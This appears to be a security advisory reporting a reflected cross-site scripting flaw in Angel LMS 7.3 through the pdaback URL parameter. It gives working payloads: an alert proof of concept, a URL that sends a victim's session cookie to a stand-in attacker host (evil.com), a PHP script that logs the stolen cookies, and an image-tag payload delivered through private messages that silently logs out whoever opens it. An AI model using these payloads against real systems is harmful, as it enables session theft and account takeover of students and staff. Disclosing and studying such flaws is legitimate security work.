I have discovered a security exploit in Angel LMS 7.3

"Colleges and universities worldwide choose the ANGEL LMS to deliver
powerful online teaching and learning experiences. ANGEL provides the
comprehensive LMS features institutions need in a simple interface
that promotes adoption. A recognized innovator, you can count on ANGEL
to deliver on the promise of technology to improve education:"

Here are the relevant technical details.

Angel Learning Management 7.3 is vulnerable to a Cross Site Scripting
exploit. This exploit allows the injection of arbitrary javascript
through a URL parameter. This is a non-persistent exploit, meaning it
is subject to a user controlled variable (the url parameter). This
exploit can be used to steal the session data from the cookie of
another user, and gain the privileges of that user.

This exploit can also be used in combination with "Cross Site Request
Forgery". Meaning if the session data in the cookie was made HTTPOnly
(which it isn't) then the exploit could be used to undergo any action
of the privileged user regardless.

PROOF OF CONCEPT:

https://[Angel Root]/portal/pdaview.asp?p_TS=
85546&p_id=InTouchMail&pdaback=%22%3Cbody%20onload=alert%28%22pwnt%22%29;%3E?p_TS=85546

the second part un url-encoded: <body onload=alert("pwnt");>

Cookie Stealing:

https://[Angel Root]/portal/pdaview.asp?p_TS=85546&p_id=InTouchMail&pdaback="<script>document.location="http://evil.com/pentest/pwnt.php?cookie="%2bdocument.cookie;</script>?p_TS=85546

(Note that the plus sign is url-encoded, or else it will not work)

Server code:

<?php

$pwnt = $_GET["cookie"];
$list = fopen('test.txt', 'a');
fwrite($list, $pwnt."\n");
fclose($list);

?>

Image tag version with CSRF, this can be sent through the Private
Message system and logs out the user who opens it:

<p><img width="0" height="0"
src="/portal/pdaview.asp?p_TS=85546&amp;p_id=InTouchMail&amp;pdaback=&quot;&lt;body
onload=document.location=&quot;https://[Angel
Root]/signon/logout.asp&quot;;&gt;?p_TS=85546" alt="" /></p>

The script makes a GET request to the url containing the exploit,
which then redirects the user to the logout url (which requires no
verification). This is a contrived example because you could put the
login url there directly, but it showcases the dangers of CSRF and XSS
together, because of a lack of checking to see whether a request is
legitimate (beyond the cookies of a user) and the fact that POST based
requests can be automated using XSS means the only limit is your
imagination. This example all happens without the user's knowledge,
and without seeing anything but a blank message. If they try to open
another message or do anything after, they will receive an error
message.
